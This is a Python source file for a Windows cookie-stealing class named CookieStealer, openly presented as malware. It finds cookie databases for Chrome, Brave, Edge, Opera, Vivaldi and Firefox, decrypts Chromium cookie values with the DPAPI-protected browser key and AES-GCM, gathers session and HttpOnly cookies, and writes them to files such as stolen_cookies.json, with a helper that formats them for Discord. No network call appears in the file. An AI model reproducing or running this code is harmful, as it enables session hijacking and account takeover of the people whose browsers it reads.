import os
import sys
import json
import base64
import sqlite3
import shutil
import tempfile
import win32crypt
from Crypto.Cipher import AES
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Tuple

class CookieStealer:
    def __init__(self):
        self.localappdata = os.getenv("LOCALAPPDATA")
        self.appdata = os.getenv("APPDATA")
        self.temp_dir = tempfile.gettempdir()
        self.cookies = []
        
    def get_browser_cookie_paths(self):
        browser_paths = []
        
        browsers = [
            {
                "name": "Chrome",
                "path": os.path.join(self.localappdata, "Google", "Chrome", "User Data"),
                "local_state": os.path.join(self.localappdata, "Google", "Chrome", "User Data", "Local State"),
                "cookie_paths": ["Default", "Profile 1", "Profile 2", "Profile 3"]
            },
            {
                "name": "Brave",
                "path": os.path.join(self.localappdata, "BraveSoftware", "Brave-Browser", "User Data"),
                "local_state": os.path.join(self.localappdata, "BraveSoftware", "Brave-Browser", "User Data", "Local State"),
                "cookie_paths": ["Default", "Profile 1", "Profile 2"]
            },
            {
                "name": "Edge",
                "path": os.path.join(self.localappdata, "Microsoft", "Edge", "User Data"),
                "local_state": os.path.join(self.localappdata, "Microsoft", "Edge", "User Data", "Local State"),
                "cookie_paths": ["Default", "Profile 1", "Profile 2"]
            },
            {
                "name": "Opera",
                "path": os.path.join(self.appdata, "Opera Software", "Opera Stable"),
                "local_state": os.path.join(self.appdata, "Opera Software", "Opera Stable", "Local State"),
                "cookie_paths": ["Default"]
            },
            {
                "name": "Opera GX",
                "path": os.path.join(self.appdata, "Opera Software", "Opera GX Stable"),
                "local_state": os.path.join(self.appdata, "Opera Software", "Opera GX Stable", "Local State"),
                "cookie_paths": ["Default"]
            },
            {
                "name": "Vivaldi",
                "path": os.path.join(self.localappdata, "Vivaldi", "User Data"),
                "local_state": os.path.join(self.localappdata, "Vivaldi", "User Data", "Local State"),
                "cookie_paths": ["Default"]
            }
        ]
        
        for browser in browsers:
            if os.path.exists(browser["path"]):
                browser_paths.append(browser)
        
        return browser_paths
    
    def get_firefox_cookie_paths(self):
        firefox_paths = []
        
        firefox_profiles = os.path.join(self.appdata, "Mozilla", "Firefox", "Profiles")
        
        if os.path.exists(firefox_profiles):
            for profile in os.listdir(firefox_profiles):
                if profile.endswith(".default") or profile.endswith(".default-release"):
                    cookie_path = os.path.join(firefox_profiles, profile, "cookies.sqlite")
                    if os.path.exists(cookie_path):
                        firefox_paths.append({
                            "name": "Firefox",
                            "profile": profile,
                            "cookie_path": cookie_path
                        })
        
        return firefox_paths
    
    def get_encryption_key(self, local_state_path):
        try:
            if not os.path.exists(local_state_path):
                return None
            
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]  # Remove "DPAPI" prefix
            
            decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return decrypted_key
        except:
            return None
    
    def decrypt_aes_gcm(self, encrypted_value, key):
        try:
            if not encrypted_value.startswith(b"v10") and not encrypted_value.startswith(b"v11"):
                return None
            
            nonce = encrypted_value[3:15]
            ciphertext = encrypted_value[15:-16]
            tag = encrypted_value[-16:]
            
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted.decode("utf-8")
        except:
            return None
    
    def decrypt_dpapi(self, encrypted_value):
        try:
            decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
            return decrypted.decode("utf-8")
        except:
            return None
    
    def decrypt_cookie_value(self, encrypted_value, key):
        # Try AES-GCM first
        if key:
            result = self.decrypt_aes_gcm(encrypted_value, key)
            if result:
                return result
        
        # Fallback to DPAPI
        result = self.decrypt_dpapi(encrypted_value)
        return result if result else ""
    
    def steal_chromium_cookies(self):
        cookies = []
        
        for browser in self.get_browser_cookie_paths():
            key = self.get_encryption_key(browser.get("local_state", ""))
            
            for profile in browser.get("cookie_paths", ["Default"]):
                cookie_db = os.path.join(browser["path"], profile, "Network", "Cookies")
                
                if not os.path.exists(cookie_db):
                    cookie_db = os.path.join(browser["path"], profile, "Cookies")
                
                if os.path.exists(cookie_db):
                    try:
                        temp_db = os.path.join(self.temp_dir, f"cookies_{browser['name']}_{profile}.db")
                        shutil.copy2(cookie_db, temp_db)
                        
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        
                        cursor.execute("""
                            SELECT host_key, name, encrypted_value, path, expires_utc,
                                   is_secure, is_httponly, creation_utc, last_access_utc,
                                   has_expires, is_persistent, priority, samesite,
                                   source_scheme, source_port
                            FROM cookies
                        """)
                        
                        for row in cursor.fetchall():
                            (host, name, encrypted_value, path, expires, secure,
                             httponly, creation, last_access, has_expires,
                             is_persistent, priority, samesite, source_scheme,
                             source_port) = row
                            
                            decrypted_value = self.decrypt_cookie_value(encrypted_value, key)
                            
                            # Convert Chrome timestamps
                            if creation:
                                try:
                                    creation_dt = datetime(1601, 1, 1) + timedelta(microseconds=creation)
                                    creation_str = creation_dt.isoformat()
                                except:
                                    creation_str = str(creation)
                            else:
                                creation_str = None
                            
                            if expires:
                                try:
                                    expires_dt = datetime(1601, 1, 1) + timedelta(microseconds=expires)
                                    expires_str = expires_dt.isoformat()
                                except:
                                    expires_str = str(expires)
                            else:
                                expires_str = None
                            
                            cookies.append({
                                "browser": browser["name"],
                                "profile": profile,
                                "host": host,
                                "name": name,
                                "value": decrypted_value,
                                "path": path,
                                "expires": expires_str,
                                "is_secure": bool(secure),
                                "is_httponly": bool(httponly),
                                "creation_time": creation_str,
                                "last_access_time": last_access,
                                "has_expires": bool(has_expires),
                                "is_persistent": bool(is_persistent),
                                "priority": priority,
                                "same_site": samesite,
                                "source_scheme": source_scheme,
                                "source_port": source_port
                            })
                        
                        conn.close()
                        os.remove(temp_db)
                    except Exception as e:
                        pass
        
        return cookies
    
    def steal_firefox_cookies(self):
        cookies = []
        
        for firefox in self.get_firefox_cookie_paths():
            try:
                temp_db = os.path.join(self.temp_dir, f"firefox_cookies_{firefox['profile']}.db")
                shutil.copy2(firefox["cookie_path"], temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                cursor.execute("""
                    SELECT host, name, value, path, expiry, isSecure, isHttpOnly,
                           creationTime, lastAccessed, sameSite, rawSameSite
                    FROM moz_cookies
                """)
                
                for row in cursor.fetchall():
                    (host, name, value, path, expiry, secure, httponly,
                     creation, last_access, same_site, raw_same_site) = row
                    
                    # Convert Firefox timestamps (microseconds since epoch)
                    if creation:
                        creation_dt = datetime.fromtimestamp(creation / 1000000)
                        creation_str = creation_dt.isoformat()
                    else:
                        creation_str = None
                    
                    if expiry:
                        expiry_dt = datetime.fromtimestamp(expiry / 1000000)
                        expiry_str = expiry_dt.isoformat()
                    else:
                        expiry_str = None
                    
                    if last_access:
                        last_access_dt = datetime.fromtimestamp(last_access / 1000000)
                        last_access_str = last_access_dt.isoformat()
                    else:
                        last_access_str = None
                    
                    cookies.append({
                        "browser": "Firefox",
                        "profile": firefox["profile"],
                        "host": host,
                        "name": name,
                        "value": value,
                        "path": path,
                        "expires": expiry_str,
                        "is_secure": bool(secure),
                        "is_httponly": bool(httponly),
                        "creation_time": creation_str,
                        "last_access_time": last_access_str,
                        "same_site": same_site,
                        "raw_same_site": raw_same_site
                    })
                
                conn.close()
                os.remove(temp_db)
            except:
                pass
        
        return cookies
    
    def format_cookies_for_discord(self, cookies, limit=200):
        formatted = []
        
        for cookie in cookies[:limit]:
            formatted.append({
                "browser": cookie.get("browser", ""),
                "host": cookie.get("host", ""),
                "name": cookie.get("name", ""),
                "value": cookie.get("value", ""),
                "expires": cookie.get("expires", ""),
                "is_secure": cookie.get("is_secure", False)
            })
        
        return formatted
    
    def steal_all_cookies(self):
        all_cookies = []
        
        # Steal Chromium-based browser cookies
        chromium_cookies = self.steal_chromium_cookies()
        all_cookies.extend(chromium_cookies)
        
        # Steal Firefox cookies
        firefox_cookies = self.steal_firefox_cookies()
        all_cookies.extend(firefox_cookies)
        
        return all_cookies
    
    def export_cookies_to_json(self, cookies, output_path=None):
        if output_path is None:
            output_path = os.path.join(self.temp_dir, "stolen_cookies.json")
        
        try:
            with open(output_path, "w", encoding="utf-8") as f:
                json.dump(cookies, f, indent=2, default=str)
            return output_path
        except:
            return None
    
    def export_cookies_to_netscape(self, cookies, output_path=None):
        if output_path is None:
            output_path = os.path.join(self.temp_dir, "cookies.txt")
        
        try:
            with open(output_path, "w", encoding="utf-8") as f:
                f.write("# Netscape HTTP Cookie File\n")
                f.write("# Generated by CookieStealer\n\n")
                
                for cookie in cookies:
                    domain = cookie.get("host", "")
                    flag = "TRUE" if cookie.get("host", "").startswith(".") else "FALSE"
                    path = cookie.get("path", "/")
                    secure = "TRUE" if cookie.get("is_secure", False) else "FALSE"
                    expiry = str(int(cookie.get("expires", 0))) if cookie.get("expires") else "0"
                    name = cookie.get("name", "")
                    value = cookie.get("value", "")
                    
                    f.write(f"{domain}\t{flag}\t{path}\t{secure}\t{expiry}\t{name}\t{value}\n")
            
            return output_path
        except:
            return None
    
    def get_cookie_by_domain(self, cookies, domain):
        matching_cookies = []
        
        for cookie in cookies:
            if domain.lower() in cookie.get("host", "").lower():
                matching_cookies.append(cookie)
        
        return matching_cookies
    
    def get_session_cookies(self, cookies):
        session_cookies = []
        
        for cookie in cookies:
            if not cookie.get("expires") or cookie.get("expires") == "0":
                session_cookies.append(cookie)
        
        return session_cookies
    
    def get_persistent_cookies(self, cookies):
        persistent_cookies = []
        
        for cookie in cookies:
            if cookie.get("expires") and cookie.get("expires") != "0":
                persistent_cookies.append(cookie)
        
        return persistent_cookies
    
    def get_secure_cookies(self, cookies):
        secure_cookies = []
        
        for cookie in cookies:
            if cookie.get("is_secure", False):
                secure_cookies.append(cookie)
        
        return secure_cookies
    
    def get_httponly_cookies(self, cookies):
        httponly_cookies = []
        
        for cookie in cookies:
            if cookie.get("is_httponly", False):
                httponly_cookies.append(cookie)
        
        return httponly_cookies
    
    def steal_all(self):
        cookies = self.steal_all_cookies()
        
        return {
            "total_count": len(cookies),
            "cookies": cookies,
            "session_cookies": self.get_session_cookies(cookies),
            "persistent_cookies": self.get_persistent_cookies(cookies),
            "secure_cookies": self.get_secure_cookies(cookies),
            "httponly_cookies": self.get_httponly_cookies(cookies)
        }

if __name__ == "__main__":
    stealer = CookieStealer()
    data = stealer.steal_all()
    print(f"Total cookies stolen: {data['total_count']}")
    print(json.dumps(data['cookies'][:5], indent=2, default=str))